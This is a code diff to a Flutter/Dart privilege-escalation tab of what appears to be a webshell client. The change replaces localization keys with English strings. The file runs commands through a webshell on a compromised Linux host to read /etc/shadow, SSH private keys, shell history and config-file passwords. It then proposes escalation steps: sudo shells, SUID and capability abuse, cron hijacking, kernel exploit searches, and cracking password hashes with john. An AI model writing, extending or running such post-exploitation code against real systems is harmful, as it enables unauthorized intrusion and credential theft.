@@ -3,8 +3,6 @@ import 'package:flutter/services.dart';
 
 import '../services/webshell_service.dart';
 import '../theme/app_theme.dart';
-import '../app/localization.dart';
-
 class _PrivEscSuggestion {
   final String title;
   final String reason;
@@ -65,156 +63,156 @@ class _PrivEscTabState extends State<PrivEscTab>
   static List<_PrivEscGroup> get _groups => [
     _PrivEscGroup(
       id: 'current_priv',
-      title: S.privEscGroupCurrentPriv,
+      title: 'Current privileges',
       icon: Icons.person_outline,
       color: AppColors.primary,
       items: [
         _PrivEscItem(
           id: 'user_group',
-          name: S.privEscItemUserGroup,
+          name: 'User & group',
           command: 'id && whoami',
-          description: S.privEscItemUserGroupDesc,
+          description: 'Current user UID/GID and groups',
         ),
         _PrivEscItem(
           id: 'sudo',
-          name: S.privEscItemSudo,
+          name: 'Sudo privileges',
           command: 'sudo -l 2>&1',
-          description: S.privEscItemSudoDesc,
+          description: 'Commands executable via sudo without password',
         ),
         _PrivEscItem(
           id: 'env',
-          name: S.privEscItemEnv,
+          name: 'Environment variables',
           command: 'env 2>/dev/null',
-          description: S.privEscItemEnvDesc,
+          description: 'Environment variables may contain credentials',
         ),
       ],
     ),
     _PrivEscGroup(
       id: 'sys_info',
-      title: S.privEscGroupSysInfo,
+      title: 'System info',
       icon: Icons.computer_outlined,
       color: AppColors.cyan,
       items: [
         _PrivEscItem(
           id: 'kernel',
-          name: S.privEscItemKernel,
+          name: 'Kernel version',
           command: 'uname -a',
-          description: S.privEscItemKernelDesc,
+          description: 'Check kernel version to match local privilege escalation exploits',
         ),
         _PrivEscItem(
           id: 'distro',
-          name: S.privEscItemDistro,
+          name: 'Distribution',
           command:
               'cat /etc/os-release 2>/dev/null || cat /etc/issue 2>/dev/null',
-          description: S.privEscItemDistroDesc,
+          description: 'Linux distribution and version',
         ),
         _PrivEscItem(
           id: 'logged_users',
-          name: S.privEscItemLoggedUsers,
+          name: 'Logged-in users',
           command: 'w 2>/dev/null || who 2>/dev/null',
-          description: S.privEscItemLoggedUsersDesc,
+          description: 'Current active sessions',
         ),
         _PrivEscItem(
           id: 'root_procs',
-          name: S.privEscItemRootProcs,
+          name: 'Processes running as root',
           command: 'ps aux 2>/dev/null | grep "^root" | head -20',
-          description: S.privEscItemRootProcsDesc,
+          description: 'Service processes running as root',
         ),
       ],
     ),
     _PrivEscGroup(
       id: 'esc_vectors',
-      title: S.privEscGroupEscVectors,
+      title: 'Escalation vectors',
       icon: Icons.security_outlined,
       color: const Color(0xFFFF9800),
       items: [
         _PrivEscItem(
           id: 'suid',
-          name: S.privEscItemSuid,
+          name: 'SUID files',
           command: r'find / -perm -4000 -type f 2>/dev/null | head -30',
-          description: S.privEscItemSuidDesc,
+          description: 'Executables with SUID bit set (may be used for escalation)',
         ),
         _PrivEscItem(
           id: 'sgid',
-          name: S.privEscItemSgid,
+          name: 'SGID files',
           command: r'find / -perm -2000 -type f 2>/dev/null | head -20',
-          description: S.privEscItemSgidDesc,
+          description: 'Executables with SGID bit set',
         ),
         _PrivEscItem(
           id: 'capabilities',
-          name: S.privEscItemCap,
+          name: 'Capabilities',
           command: 'getcap -r / 2>/dev/null',
-          description: S.privEscItemCapDesc,
+          description: 'Files with Linux capabilities',
         ),
         _PrivEscItem(
           id: 'cron',
-          name: S.privEscItemCron,
+          name: 'Cron jobs',
           command:
               'crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null',
-          description: S.privEscItemCronDesc,
+          description: 'Scheduled task configuration and scripts',
         ),
         _PrivEscItem(
           id: 'cron_writable',
-          name: S.privEscItemCronWritable,
+          name: 'Writable cron scripts',
           command:
               r'find /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly /var/spool/cron \( -type f -o -type l \) 2>/dev/null -exec sh -c "m=$(stat -c \"%a\" \"$1\" 2>/dev/null);u=$(stat -c \"%u\" \"$1\" 2>/dev/null);g=$(stat -c \"%g\" \"$1\" 2>/dev/null);myu=$(id -u);o=$((m/100));gr=$((m/10%10));t=$((m%10));[ $((t&2)) -ne 0 ] && echo \"$1\";[ \"$u\" = \"$myu\" ] && [ $((o&2)) -ne 0 ] && echo \"$1\";id -G | tr \" \" \"\n\" | grep -q \"^${g}$\" && [ $((gr&2)) -ne 0 ] && echo \"$1\"" _ {} \;',
-          description: S.privEscItemCronWritableDesc,
+          description: 'Writable by current user/group based on permission bits (read-only check, no side effects)',
         ),
         _PrivEscItem(
           id: 'writable_dirs',
-          name: S.privEscItemWritableDirs,
+          name: 'Writable directories',
           command:
               r"find / -writable -type d 2>/dev/null | grep -Ev '/proc|/sys|/dev|/run' | head -20",
-          description: S.privEscItemWritableDirsDesc,
+          description: 'Directories writable by the current user',
         ),
         _PrivEscItem(
           id: 'path_hijack',
-          name: S.privEscItemPathHijack,
+          name: 'PATH hijacking',
           command:
               r'echo $PATH && find $(echo $PATH | tr ":" " ") -writable 2>/dev/null',
-          description: S.privEscItemPathHijackDesc,
+          description: 'Check for writable directories in PATH',
         ),
       ],
     ),
     _PrivEscGroup(
       id: 'sensitive_info',
-      title: S.privEscGroupSensitiveInfo,
+      title: 'Sensitive information',
       icon: Icons.key_outlined,
       color: AppColors.red,
       items: [
         _PrivEscItem(
           id: 'loginable_accounts',
-          name: S.privEscItemLoginableAccounts,
+          name: 'Loginable accounts',
           command:
               r"cat /etc/passwd | grep -Ev 'nologin|false|sync|halt|shutdown'",
-          description: S.privEscItemLoginableAccountsDesc,
+          description: 'User accounts that can log in normally',
         ),
         _PrivEscItem(
           id: 'shadow',
-          name: S.privEscItemShadow,
+          name: 'Shadow file',
           command: 'cat /etc/shadow 2>/dev/null',
-          description: S.privEscItemShadowDesc,
+          description: 'Attempt to read password hashes (requires root)',
         ),
         _PrivEscItem(
           id: 'history',
-          name: S.privEscItemHistory,
+          name: 'Command history',
           command:
               'cat ~/.bash_history 2>/dev/null || cat ~/.zsh_history 2>/dev/null | head -40',
-          description: S.privEscItemHistoryDesc,
+          description: 'Command history may contain plaintext credentials',
         ),
         _PrivEscItem(
           id: 'ssh_keys',
-          name: S.privEscItemSshKeys,
+          name: 'SSH keys',
           command:
               'ls -la ~/.ssh/ 2>/dev/null && cat ~/.ssh/id_rsa 2>/dev/null | head -5',
-          description: S.privEscItemSshKeysDesc,
+          description: 'Whether private key files are readable',
         ),
         _PrivEscItem(
           id: 'config_passwords',
-          name: S.privEscItemConfigPasswords,
+          name: 'Config file passwords',
           command:
               r"grep -rls 'password\|passwd\|pass=' /var/www /etc 2>/dev/null | head -10 | xargs grep -h 'password\|passwd' 2>/dev/null | grep -v '^#' | head -20",
-          description: S.privEscItemConfigPasswordsDesc,
+          description: 'Plaintext passwords in web/system config files',
         ),
       ],
     ),
@@ -229,14 +227,14 @@ class _PrivEscTabState extends State<PrivEscTab>
       final out = await widget.service.executeCommand(item.command);
       if (mounted) {
         setState(() {
-          _results[key] = out.trim().isEmpty ? S.noOutput : out.trim();
+          _results[key] = out.trim().isEmpty ? '(no output)' : out.trim();
           _running[key] = false;
         });
       }
     } catch (e) {
       if (mounted) {
         setState(() {
-          _results[key] = S.errorResult(e);
+          _results[key] = '[Error] $e';
           _running[key] = false;
         });
       }
@@ -271,8 +269,8 @@ class _PrivEscTabState extends State<PrivEscTab>
       if (sudo.contains('(ALL)') || sudo.contains('ALL')) {
         suggestions.add(
           _PrivEscSuggestion(
-            title: S.privEscSudoAllTitle,
-            reason: S.privEscSudoAllReason,
+            title: 'Sudo passwordless escalation',
+            reason: 'Detected sudo can run ALL without password. Direct escalation:',
             commands: ['sudo su', 'sudo -i', 'sudo bash'],
           ),
         );
@@ -316,10 +314,8 @@ class _PrivEscTabState extends State<PrivEscTab>
         }
         suggestions.add(
           _PrivEscSuggestion(
-            title: S.privEscSudoLimitedTitle,
-            reason: S.privEscSudoLimitedReason(
-              '${paths.take(3).join(", ")}${paths.length > 3 ? "…" : ""}',
-            ),
+            title: 'Sudo limited command escalation',
+            reason: 'Detected passwordless sudo: ${'${paths.take(3).join(", ")}${paths.length > 3 ? "…" : ""}'}',
             commands: cmds,
           ),
         );
@@ -329,8 +325,8 @@ class _PrivEscTabState extends State<PrivEscTab>
     // 2. SUID 提权（解析实际路径，使用完整路径执行）
     final suid = res('esc_vectors', 'suid');
     if (suid.isNotEmpty &&
-        suid != S.noOutput &&
-        !suid.startsWith(S.logErrorTag)) {
+        suid != '(no output)' &&
+        !suid.startsWith('[Error]')) {
       final pathRegex = RegExp(r'(/[^\s]+)');
       final paths = pathRegex
           .allMatches(suid)
@@ -395,8 +391,8 @@ class _PrivEscTabState extends State<PrivEscTab>
       if (cmds.isNotEmpty) {
         suggestions.add(
           _PrivEscSuggestion(
-            title: S.privEscSuidTitle,
-            reason: S.privEscSuidReason,
+            title: 'SUID escalation',
+            reason: 'Found exploitable SUID files. Execute in terminal (requires writable directory):',
             commands: cmds,
           ),
         );
@@ -406,16 +402,16 @@ class _PrivEscTabState extends State<PrivEscTab>
     // 3. 内核 EXP（需本地查找 exploit，非 100%）
     final uname = res('sys_info', 'kernel');
     if (uname.isNotEmpty &&
-        uname != S.noOutput &&
-        !uname.startsWith(S.logErrorTag)) {
+        uname != '(no output)' &&
+        !uname.startsWith('[Error]')) {
       final verMatch = RegExp(r'(\d+\.\d+\.\d+)').firstMatch(uname);
       final archMatch = RegExp(r'(x86_64|i686|aarch64|arm)').firstMatch(uname);
       if (verMatch != null) {
         final arch = archMatch?.group(1) ?? 'x86_64';
         suggestions.add(
           _PrivEscSuggestion(
-            title: S.privEscKernelTitle,
-            reason: S.privEscKernelReason(verMatch.group(1)!, arch),
+            title: 'Kernel escalation (find exploit locally)',
+            reason: 'Kernel ${verMatch.group(1)!} ($arch). Search for matching CVE locally',
             commands: [
               'searchsploit Linux Kernel ${verMatch.group(1)}',
               '# https://www.exploit-db.com/search?q=${Uri.encodeComponent('Linux Kernel ${verMatch.group(1)}')}',
@@ -429,8 +425,8 @@ class _PrivEscTabState extends State<PrivEscTab>
     // 4. Shadow 破解（需本地破解，成功率取决于密码强度）
     final shadow = res('sensitive_info', 'shadow');
     if (shadow.isNotEmpty &&
-        shadow != S.noOutput &&
-        !shadow.startsWith(S.logErrorTag) &&
+        shadow != '(no output)' &&
+        !shadow.startsWith('[Error]') &&
         !shadow.contains('Permission denied') &&
         RegExp(r'root:\$[156]\$').hasMatch(shadow)) {
       final hashMode = shadow.contains(r'$6$')
@@ -440,8 +436,8 @@ class _PrivEscTabState extends State<PrivEscTab>
           : ('500', 'md5crypt');
       suggestions.add(
         _PrivEscSuggestion(
-          title: S.privEscShadowTitle,
-          reason: S.privEscShadowReason(hashMode.$2),
+          title: 'Password hash cracking (crack locally)',
+          reason: 'Obtained shadow. Crack locally (${hashMode.$2}). Success rate depends on password strength',
           commands: [
             'unshadow /etc/passwd /etc/shadow > hashes.txt',
             'john hashes.txt',
@@ -455,8 +451,8 @@ class _PrivEscTabState extends State<PrivEscTab>
     // 5. Cron 脚本劫持（仅当检测到可写文件时建议，100% 可提权）
     final cronWritable = res('esc_vectors', 'cron_writable');
     if (cronWritable.isNotEmpty &&
-        cronWritable != S.noOutput &&
-        !cronWritable.startsWith(S.logErrorTag)) {
+        cronWritable != '(no output)' &&
+        !cronWritable.startsWith('[Error]')) {
       final writablePaths = cronWritable
           .split('\n')
           .map((s) => s.trim())
@@ -474,10 +470,8 @@ class _PrivEscTabState extends State<PrivEscTab>
         ];
         suggestions.add(
           _PrivEscSuggestion(
-            title: S.privEscCronTitle,
-            reason: S.privEscCronReason(
-              '${writablePaths.take(2).join(", ")}${writablePaths.length > 2 ? "…" : ""}',
-            ),
+            title: 'Cron hijacking (write access confirmed)',
+            reason: 'Auto-detected writable cron files: ${'${writablePaths.take(2).join(", ")}${writablePaths.length > 2 ? "…" : ""}'}',
             commands: cmds,
           ),
         );
@@ -489,8 +483,8 @@ class _PrivEscTabState extends State<PrivEscTab>
     // 6. Capabilities 提权（解析实际二进制路径）
     final cap = res('esc_vectors', 'capabilities');
     if (cap.isNotEmpty &&
-        cap != S.noOutput &&
-        !cap.startsWith(S.logErrorTag) &&
+        cap != '(no output)' &&
+        !cap.startsWith('[Error]') &&
         cap.contains('cap_setuid')) {
       final paths = RegExp(r'(\S+)\s*=\s*.*cap_setuid')
           .allMatches(cap)
@@ -512,8 +506,8 @@ class _PrivEscTabState extends State<PrivEscTab>
       }
       suggestions.add(
         _PrivEscSuggestion(
-          title: S.privEscCapTitle,
-          reason: S.privEscCapReason,
+          title: 'Capabilities escalation',
+          reason: 'Found cap_setuid. Execute the path above directly:',
           commands: cmds,
         ),
       );
@@ -541,7 +535,7 @@ class _PrivEscTabState extends State<PrivEscTab>
               const Icon(Icons.shield_outlined, color: AppColors.red, size: 16),
               const SizedBox(width: 8),
               Text(
-                S.privEscTitle,
+                'Privilege escalation checks',
                 style: AppTextStyles.heading(size: 14, color: AppColors.red),
               ),
               if (doneCount > 0) ...[
@@ -569,7 +563,7 @@ class _PrivEscTabState extends State<PrivEscTab>
                 TextButton.icon(
                   onPressed: _runningAll ? null : _clearAll,
                   icon: const Icon(Icons.delete_sweep_outlined, size: 14),
-                  label: Text(S.btnClear),
+                  label: Text('Clear'),
                   style: TextButton.styleFrom(
                     foregroundColor: AppColors.textSecondary,
                     padding: const EdgeInsets.symmetric(horizontal: 8),
@@ -588,7 +582,7 @@ class _PrivEscTabState extends State<PrivEscTab>
                         ),
                       )
                     : const Icon(Icons.play_arrow_rounded, size: 15),
-                label: Text(_runningAll ? S.checkingAll : S.btnCheckAll),
+                label: Text(_runningAll ? 'Checking…' : 'Check all'),
                 style: FilledButton.styleFrom(
                   backgroundColor: AppColors.red,
                   foregroundColor: Colors.white,
@@ -622,7 +616,7 @@ class _PrivEscTabState extends State<PrivEscTab>
                         Clipboard.setData(ClipboardData(text: cmd));
                         ScaffoldMessenger.of(context).showSnackBar(
                           SnackBar(
-                            content: Text(S.snackCopied),
+                            content: Text('Copied to clipboard'),
                             duration: const Duration(seconds: 1),
                             behavior: SnackBarBehavior.floating,
                           ),
@@ -675,7 +669,7 @@ class _PrivEscSuggestionsCard extends StatelessWidget {
               Icon(Icons.lightbulb_outline, size: 18, color: AppColors.primary),
               const SizedBox(width: 8),
               Text(
-                S.privEscSuggestions,
+                'Privilege escalation suggestions (based on results)',
                 style: AppTextStyles.heading(
                   size: 14,
                   color: AppColors.primary,
@@ -782,7 +776,7 @@ class _PrivEscSuggestionsCard extends StatelessWidget {
                                 padding: const EdgeInsets.all(4),
                                 minimumSize: const Size(28, 28),
                               ),
-                              tooltip: S.actionCopy,
+                              tooltip: 'Copy',
                             ),
                           ],
                         ],
@@ -875,8 +869,8 @@ class _PrivEscItemWidget extends StatelessWidget {
   @override
   Widget build(BuildContext context) {
     final hasResult = result != null;
-    final isError = result?.startsWith(S.logErrorTag) == true;
-    final isNoOutput = result == S.noOutput;
+    final isError = result?.startsWith('[Error]') == true;
+    final isNoOutput = result == '(no output)';
 
     return Container(
       margin: const EdgeInsets.only(bottom: 8),
@@ -971,7 +965,7 @@ class _PrivEscItemWidget extends StatelessWidget {
                             ),
                           ),
                           child: Text(
-                            hasResult ? S.btnRetry : S.btnExecute,
+                            hasResult ? 'Retry' : 'Run',
                             style: AppTextStyles.caption(
                               size: 11,
                               color: color,
@@ -1003,7 +997,7 @@ class _PrivEscItemWidget extends StatelessWidget {
               ),
               padding: const EdgeInsets.all(10),
               child: SelectableText(
-                isNoOutput ? S.noOutput : result!,
+                isNoOutput ? '(no output)' : result!,
                 style: TextStyle(
                   fontFamily: 'Monaco',
                   fontFamilyFallback: const ['Courier New', 'monospace'],
